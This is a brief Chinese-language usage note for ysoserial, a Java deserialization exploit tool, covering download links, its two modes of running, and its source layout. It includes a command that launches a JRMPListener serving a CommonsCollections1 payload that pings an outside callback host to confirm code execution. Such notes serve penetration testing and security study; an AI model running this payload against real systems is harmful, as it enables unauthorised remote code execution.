# ysoserial反序列

## 0、前言

>   java反序列利用神器





## 1、下载

```bash
https://github.com/frohoff/ysoserial/releases/tag/v0.0.6
或者
git clone https://github.com/frohoff/ysoserial.git
```

## 2、使用

-   主要有两种使用方：
    -   一种是运行ysoserial.jar 中的主类函数，
    -   另一种是运行ysoserial中的exploit 类，
    -    二者的效果是不一样的，一般用第二种方式开启交互服务

```basic
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPListener 38471
java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'ping -c 2  rce.267hqw.ceye.io'
```

**目录结构**

```java
ysoserial
    ├─ Deserializer.java			// 反序列化
    ├─ GeneratePayload.java			// 生成对应序列化内容
    ├─ Serializer.java				// 序列化
    ├─ Strings.java
    ├─ exploit
    ├─ payloads
    └─ secmgr
```

